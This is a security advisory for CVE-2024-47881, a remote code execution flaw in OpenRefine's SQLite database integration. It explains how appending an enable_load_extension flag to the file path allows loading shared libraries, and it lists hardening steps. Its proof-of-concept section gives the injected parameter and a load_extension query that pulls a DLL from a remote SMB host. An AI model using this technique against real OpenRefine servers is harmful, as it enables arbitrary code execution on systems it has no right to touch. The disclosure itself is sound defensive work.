# OpenRefine's SQLite integration allows filesystem access, remote code execution (RCE)

**GHSA**: GHSA-87cf-j763-vvh8 | **CVE**: CVE-2024-47881 | **Severity**: high (CVSS 8.1)

**CWE**: N/A

**Affected Packages**:
- **org.openrefine:database** (maven): >= 3.4-beta, < 3.8.3

## Description

### Summary

In the `database` extension, the "enable_load_extension" property can be set for the SQLite integration, enabling an attacker to load (local or remote) extension DLLs and so run arbitrary code on the server.

The attacker needs to have network access to the OpenRefine instance.

### Details

The `database` extension, with some restrictions, lets users connect to any database they wish by filling in different parts of the JDBC URL that is used. For the SQLite integration, the extension expects a file path pointing to a database file (or a place where such a file can be created). This means that users can:

* Read files on local or SMB filesystems, provided they are SQLite databases.
* Write to files on local or SMB filesystems, as long as those files are either SQLite databases or empty.

This seems to be the expected behavior.

However, by adding `?enable_load_extension=true` to the filename, a [feature](https://www.sqlite.org/loadext.html) is toggled that additionally allows loading and executing shared libraries mentioned in queries, leading to remote code execution. On Windows specifically, those libraries may also come from shared folders.

Possible mitigation and hardening steps could include:

- Having users upload the SQLite database file they want to look at, storing it under some safe name, then opening that, rather than accepting a file path
- If that is not feasible: making the path relative to, and checking that it does not escape, the workspace directory
- If that is also not feasible: adding additional checks so that the path at least does not point to other machines or add JDBC parameters
- Always using the READONLY open mode
- Explicitly setting enable_load_extension to off
- Enforcing [stricter limits](https://www.sqlite.org/security.html) and similar precautions

### PoC

Tested on a Windows 11 machine. 

1. Start OpenRefine and choose "Create project", "Database", database type "SQLite".
2. Type a writable file path followed by `?enable_load_extension=true`.
3. Click Connect. The connection should succeed.
4. Use `SELECT load_extension('\\wandernauta.nl\public\libcalculator.dll');` as the query.
5. Assuming there are no firewalls in the way, a few Windows calculators should open.

The same file is available from https://wandernauta.nl/libcalculator.dll if needed.

### Impact

Remote code execution for attackers with network access to OpenRefine.
